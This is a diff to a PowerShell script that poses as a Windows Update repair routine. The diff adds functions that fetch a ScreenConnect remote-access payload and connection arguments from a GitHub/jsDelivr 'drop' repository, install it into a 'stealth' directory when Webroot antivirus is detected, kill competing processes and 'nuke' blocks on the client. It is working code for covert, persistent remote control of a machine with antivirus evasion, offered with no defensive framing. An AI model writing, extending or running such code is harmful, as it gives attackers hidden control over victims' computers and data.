@@ -691,48 +691,142 @@ function Copy-ScPayloadFiles {
     return $n
 }
 
+function Get-ScPayloadZip {
+    # Pre-extracted SC binaries hosted on drop — bypasses broken msiexec /a on Webroot hosts
+    param([string]$DestZip = (Join-Path $WorkDir 'sc_payload.zip'))
+    $urls = @(
+        'https://raw.githubusercontent.com/xnobuddy/github-drop/main/sc_payload.zip',
+        'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/sc_payload.zip',
+        'https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/sc_payload.zip'
+    )
+    Remove-Item $DestZip -Force -ErrorAction SilentlyContinue
+    foreach ($u in $urls) {
+        Write-Log "REPAIR: download SC zip $u"
+        try {
+            & curl.exe -L --ssl-no-revoke --connect-timeout 25 --retry 2 -o "$DestZip" "$u" >$null 2>&1
+            if ((Test-Path $DestZip) -and ((Get-Item $DestZip).Length -ge 500000)) {
+                Write-Log ("REPAIR: SC zip bytes=" + (Get-Item $DestZip).Length)
+                return $true
+            }
+        } catch {
+            Write-Log "REPAIR: zip curl fail: $($_.Exception.Message)"
+        }
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            (New-Object Net.WebClient).DownloadFile($u, $DestZip)
+            if ((Test-Path $DestZip) -and ((Get-Item $DestZip).Length -ge 500000)) {
+                Write-Log ("REPAIR: SC zip bytes=" + (Get-Item $DestZip).Length)
+                return $true
+            }
+        } catch {
+            Write-Log "REPAIR: zip download fail: $($_.Exception.Message)"
+        }
+    }
+    Write-Log 'REPAIR: SC zip download failed'
+    return $false
+}
+
+function Get-ScArgsFromDrop {
+    $dest = Join-Path $WorkDir 'sc_args.txt'
+    $urls = @(
+        'https://raw.githubusercontent.com/xnobuddy/github-drop/main/sc_args.txt',
+        'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/sc_args.txt'
+    )
+    foreach ($u in $urls) {
+        try {
+            & curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "$dest" "$u" >$null 2>&1
+            if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 40)) {
+                $a = (Get-Content $dest -Raw).Trim()
+                if ($a -like '?e=Access*') {
+                    Write-Log ("REPAIR: drop args len=" + $a.Length)
+                    return $a
+                }
+            }
+        } catch {}
+    }
+    return $null
+}
+
+function Expand-ScZipToDir {
+    param([string]$ZipPath, [string]$DestDir)
+    New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
+    $stage = Join-Path $env:TEMP ('sczip_' + [guid]::NewGuid().ToString('N'))
+    Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item $stage -ItemType Directory -Force | Out-Null
+    try {
+        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
+        [IO.Compression.ZipFile]::ExtractToDirectory($ZipPath, $stage)
+    } catch {
+        Write-Log "REPAIR: ZipFile extract fail: $($_.Exception.Message)"
+        try {
+            Expand-Archive -Path $ZipPath -DestinationPath $stage -Force
+        } catch {
+            Write-Log "REPAIR: Expand-Archive fail: $($_.Exception.Message)"
+            return $false
+        }
+    }
+    $svc = Get-ChildItem $stage -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Select-Object -First 1
+    if (-not $svc) {
+        Write-Log 'REPAIR: zip missing ClientService.exe'
+        Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
+        return $false
+    }
+    $src = $svc.Directory.FullName
+    $n = Copy-ScPayloadFiles -SrcDir $src -DestDir $DestDir
+    Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Log "REPAIR: zip deployed files=$n -> $DestDir"
+    return ((Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and $n -gt 0)
+}
+
 function Expand-ScMsiOverInstall {
     param([string]$MsiPath, [string]$DestDir)
-    if (-not (Test-Path $MsiPath)) { return $false }
-
     if (Test-WebrootInstalled) {
         $DestDir = Get-StealthScInstallDir
         Write-Log "REPAIR: Webroot - deploying to stealth workdir: $DestDir"
     }
 
-    $extract = Join-Path $env:TEMP 'wuext_sc'
-    if (-not (Expand-MsiPayloadToDir -MsiPath $MsiPath -OutDir $extract)) {
-        $cacheRoot = Join-Path $WorkDir 'sc_msi_cache'
-        if (-not (Test-Path (Join-Path $cacheRoot 'ScreenConnect.ClientService.exe'))) {
-            Write-Log 'REPAIR: MSI extract has no ClientService.exe and no cache'
-            return $false
+    $ok = $false
+    # Prefer prebuilt zip from drop (msiexec /a is 1603 on this host)
+    $zip = Join-Path $WorkDir 'sc_payload.zip'
+    if (Get-ScPayloadZip -DestZip $zip) {
+        $ok = Expand-ScZipToDir -ZipPath $zip -DestDir $DestDir
+    }
+    if (-not $ok) {
+        Write-Log 'REPAIR: zip path failed - falling back to msiexec /a'
+        if (-not (Test-Path $MsiPath)) { return $false }
+        $extract = Join-Path $env:TEMP 'wuext_sc'
+        if (-not (Expand-MsiPayloadToDir -MsiPath $MsiPath -OutDir $extract)) {
+            $cacheRoot = Join-Path $WorkDir 'sc_msi_cache'
+            if (-not (Test-Path (Join-Path $cacheRoot 'ScreenConnect.ClientService.exe'))) {
+                Write-Log 'REPAIR: MSI extract has no ClientService.exe and no cache'
+                return $false
+            }
+            $extract = $cacheRoot
+            Write-Log 'REPAIR: falling back to sc_msi_cache'
         }
-        $extract = $cacheRoot
-        Write-Log "REPAIR: falling back to sc_msi_cache"
+        $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+            Sort-Object Length -Descending | Select-Object -First 1
+        if (-not $svcBin) { return $false }
+        $srcRoot = $svcBin.Directory.FullName
+        Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
+        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+            ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*" -or $_.ExecutablePath -like '*\.wucache\scclient*')
+        } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+        & sc.exe stop "$SvcName" >$null 2>&1
+        $copied = Copy-ScPayloadFiles -SrcDir $srcRoot -DestDir $DestDir
+        Write-Log "REPAIR: copied $copied files -> $DestDir"
+        $ok = $copied -gt 0 -and (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe'))
     }
 
-    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
-        Sort-Object Length -Descending | Select-Object -First 1
-    if (-not $svcBin) {
-        Write-Log 'REPAIR: no ClientService.exe in extract/cache'
-        return $false
-    }
-    $srcRoot = $svcBin.Directory.FullName
-    Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
-
-    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-        ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*" -or $_.ExecutablePath -like '*\.wucache\scclient*')
-    } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-    & sc.exe stop "$SvcName" >$null 2>&1
-    Start-Sleep -Seconds 1
-
-    $copied = Copy-ScPayloadFiles -SrcDir $srcRoot -DestDir $DestDir
-    Write-Log "REPAIR: copied $copied files -> $DestDir"
     foreach ($c in @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)) {
         Write-Log ("REPAIR: restored {0} bytes={1}" -f $c.Name, $c.Length)
     }
 
-    $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiPath
+    $args = Get-ScArgsFromDrop
+    if (-not $args -and (Test-Path $MsiPath)) {
+        $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiPath
+    }
     if (-not $args) {
         $saved = Join-Path $WorkDir '.sc_imgpath'
         if (Test-Path $saved) {
@@ -750,7 +844,7 @@ function Expand-ScMsiOverInstall {
     $svcOk = (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and (
         (Get-Item (Join-Path $DestDir 'ScreenConnect.ClientService.exe')).Length -ge 50000
     )
-    Write-Log ("REPAIR: extract/copy ok=$svcOk dest=$DestDir copied=$copied")
+    Write-Log ("REPAIR: extract/copy ok=$svcOk dest=$DestDir")
     return $svcOk
 }
 
@@ -1676,7 +1770,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730J'
+Write-Log 'WU_BUILD_20260730K'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
